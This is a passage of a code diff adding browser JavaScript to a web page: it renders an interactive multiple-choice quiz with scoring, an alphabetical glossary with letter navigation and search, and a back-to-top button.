+          Array.from(choicesEl.children).forEach((el, ei) => {
+            el.disabled = true;
+            if (ei === item.correct) el.classList.add('correct');
+            else if (ei === ci) el.classList.add('incorrect');
+          });
+          box.querySelector('.explain').textContent = item.explain;
+          box.querySelector('.explain').classList.add('show');
+          updateScore();
+        });
+        choicesEl.appendChild(b);
+      });
+      quizList.appendChild(box);
+    });
+    updateScore();
+  }
+  function updateScore(){
+    document.getElementById('quizScore').textContent =
+      answered === 0 ? `${QUIZ.length} questions — click an answer to check yourself` : `Score: ${score} / ${answered} answered`;
+  }
+  renderQuiz();
+  document.getElementById('resetQuizBtn').addEventListener('click', renderQuiz);
+
+  const glossaryList = document.getElementById('glossaryList');
+  const alphaNav = document.getElementById('alphaNav');
+  const letters = [...new Set(TERMS.map(t => t.t[0].toUpperCase()))];
+  'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('').forEach(L => {
+    const a = document.createElement('a');
+    a.textContent = L;
+    if (letters.includes(L)) { a.href = '#g-' + L; a.className = 'has'; }
+    else { a.href = 'javascript:void(0)'; }
+    alphaNav.appendChild(a);
+  });
+  let currentLetter = '';
+  TERMS.forEach(item => {
+    const L = item.t[0].toUpperCase();
+    if (L !== currentLetter) {
+      currentLetter = L;
+      const h = document.createElement('div');
+      h.className = 'glossary-letter'; h.id = 'g-' + L; h.textContent = L;
+      glossaryList.appendChild(h);
+    }
+    const wrap = document.createElement('div');
+    wrap.className = 'gitem';
+    wrap.innerHTML = `<dt>${item.t}</dt><dd>${item.d}</dd>`;
+    wrap.dataset.search = (item.t + ' ' + item.d).toLowerCase();
+    glossaryList.appendChild(wrap);
+  });
+  document.getElementById('glossarySearch').addEventListener('input', (e) => {
+    const q = e.target.value.toLowerCase().trim();
+    document.querySelectorAll('.gitem').forEach(el => {
+      el.classList.toggle('hidden', q && !el.dataset.search.includes(q));
+    });
+  });
+
+  const backToTop = document.getElementById('backToTop');
+  function toggleBackToTop(){ backToTop.classList.toggle('show', window.scrollY > 480); }
+  window.addEventListener('scroll', toggleBackToTop, {passive:true});
+  toggleBackToTop();
+  backToTop.addEventListener('click', () => window.scrollTo({top:0, behavior:'smooth'}));
+</script>
+
